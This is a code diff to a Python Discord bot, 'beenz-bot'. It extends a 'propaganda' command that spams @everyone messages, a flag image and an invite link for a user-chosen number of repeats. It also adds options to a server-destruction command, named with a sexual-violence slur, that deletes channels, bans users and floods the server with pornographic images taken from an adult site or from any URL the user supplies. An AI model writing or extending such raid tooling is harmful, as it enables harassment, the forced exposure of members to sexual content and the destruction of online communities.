@@ -1,4 +1,4 @@
-#         ===beenz-bot v1.3.1===
+#         ===beenz-bot v1.3.2===
 #            ===beenz.py===
 #  ===Branched by TheProgramableTurtle===
 
@@ -51,7 +51,7 @@ class Bot(cmd.Bot):
         # --Help command---
         await ctx.send("```beenz-bot Version " + sysversion + " \n \n (c) 2020 @Pr0x1mas, with help from @Alexander Litvinenko \n \n Help \n \n $meme - send a meme from r/dankmemes \n \n $beans - sends a cursed bean image from r/beansinstrangeplaces```")
 
-    @cmd.command(pass_context=True)
+    @cmd.command()
     async def meme(ctx):
         # --Fake meme feature--
         memes = imagesearch.getImages("https://www.reddit.com/r/dankmemes/rising/")  # load dankmemes rising page
@@ -129,14 +129,39 @@ class Bot(cmd.Bot):
                 pass
 
 
-    @cmd.command()
-    async def propaganda(ctx):
+    @cmd.command(aliases=["spam", "echo"])
+    async def propaganda(ctx, *args):
         # --Spam server with propaganda--
-        for i in range(15):
-            await ctx.send(
-                "@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
-            await ctx.send(file=discord.File('assets/flag.png'))
-            await ctx.send("Join us: https://discord.gg/JPT9536")
+        print(args)
+        args = [arg for arg in args]
+        if len(args) == 1:
+            try: # input validation for number of messages to send
+                if int(args[0]) < float(args[0]):
+                    await ctx.send("Please enter an integer for the number of messages")
+                else:
+                    for i in range(int(args[0])):
+                        await ctx.send(
+                            "@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+                        await ctx.send(file=discord.File('assets/flag.png'))
+                        await ctx.send("Join us: https://discord.gg/JPT9536")
+            except ValueError:
+                await ctx.send("Please enter an integer for the number of messages")
+
+        elif len(args) > 1:
+            try: # input validation for number of messages to send
+                if int(args[0]) < float(args[0]):
+                    await ctx.send("Please enter an integer for the number of messages")
+                else:
+                    for i in range(int(args[0])):
+                        await ctx.send(" ".join(args[1:]))
+            except ValueError:
+                await ctx.send("Please enter an integer for the number of messages")
+        else:
+            for i in range(2):
+                await ctx.send(
+                    "@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+                await ctx.send(file=discord.File('assets/flag.png'))
+                await ctx.send("Join us: https://discord.gg/JPT9536")
 
     @cmd.command()
     async def colony(ctx):
@@ -147,7 +172,7 @@ class Bot(cmd.Bot):
             await ctx.guild.edit(icon=f.read())  # change server icon
 
     @cmd.command()
-    async def rape(ctx):
+    async def rape(ctx, *args):
         # --Destroy the server--
         # -delete all channels-
         channels = []
@@ -189,21 +214,34 @@ class Bot(cmd.Bot):
         # -spam images-
 
 
-        hentai = imagesearch.getImages("https://hentaihaven.xxx")  # load hentai from hentaihaven (kill me now)
+        # hentai = imagesearch.getImages("https://hentaihaven.xxx")  # load images from source or hentai from hentaihaven (kill me now)
+        if len(args) == 0:
+            hentai = imagesearch.getImages("https://hentaihaven.xxx")
+        elif len(args) == 1:
+            if args[0] == "instantban":
+                hentai = imagesearch.getImages("https://hentaihaven.xxx")
+            else:
+                hentai = imagesearch.getImages(str(args[0]))
+        elif len(args) > 1:
+            hentai = imagesearch.getImages(str(args[1]))
+
 
         for i in range(10):  # send some hentai before banning users
-            print(i)
+            if len(args) > 0:
+                if args[0] == "instantban": # skip pre-ban hentai if "instantban" supplied as argument
+                    break
+
             y = random.choice(hentai)  # get random bit of hentai
-            while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
+            while not y.startswith("https://hentaihaven.xxx/www/") and not len(args) > 0:  # check it is a video preview and not an asset
                 y = random.choice(hentai)
+
+
             async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                 async with session.get(y) as resp:
                     if resp.status != 200:
                         return await channel.send('`error loading image`')
                     data = io.BytesIO(await resp.read())
                     await channel.send(file=discord.File(data, os.path.basename(y)))  # send hentai
-                    print("sent")
-
 
         time.sleep(5)
 
@@ -214,11 +252,16 @@ class Bot(cmd.Bot):
                 await channel.send("couldn't ban")
 
         try:
-            while True:  # send hentai until bot is banned
+            for i in range(5):  # send hentai until bot is banned
                 y = random.choice(hentai)  # get random bit of hentai
-                while not y.startswith(
-                        "https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
-                    y = random.choice(hentai)
+                if len(args) == 1:
+                    if args[0] == "instantban":
+                        while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
+                            y = random.choice(hentai)
+                elif len(args) == 0:
+                    while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
+                        y = random.choice(hentai)
+
                 async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                     async with session.get(y) as resp:
                         if resp.status != 200:
